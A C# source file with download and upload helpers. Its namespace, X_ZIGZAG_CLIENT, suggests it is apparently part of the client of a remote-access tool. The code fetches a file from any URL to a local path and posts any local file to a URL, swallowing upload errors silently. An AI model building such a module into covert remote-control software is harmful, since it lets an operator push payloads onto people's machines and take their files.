using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Threading.Tasks;

namespace X_ZIGZAG_CLIENT
{
    internal static class FilesHandler
    {
        private static readonly HttpClient client = new HttpClient();

     
        public static async Task<string> DownloadFileAsync(string fileUrl, string savePath)
        {
            try
            {
                using (WebClient client = new WebClient())
                {
                    await client.DownloadFileTaskAsync(new Uri(fileUrl), savePath);
                }
                return $"";
            }
            catch (WebException ex)
            {
                return $"Error downloading file: {ex.Message}";
            }
            catch (IOException ex)
            {
                return $"Error saving file: {ex.Message}";
            }
            catch (Exception ex)
            {
                return $"An unexpected error occurred: {ex.Message}";
            }
        }
        public static async Task<bool> UploadFileAsync(string fileUrl, string filePath)
        {
            try
            {
                using (var form = new MultipartFormDataContent())
                {
                    using (var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
                    {
                        var streamContent = new StreamContent(fileStream);
                        streamContent.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
                        form.Add(streamContent, "file", Path.GetFileName(filePath));

                        using (HttpResponseMessage response = await client.PostAsync(fileUrl, form))
                        {
                            response.EnsureSuccessStatusCode();
                        }
                    }
                }
                return true;
            }
            catch (Exception)
            {
            }
            return false;
        }
    }
}
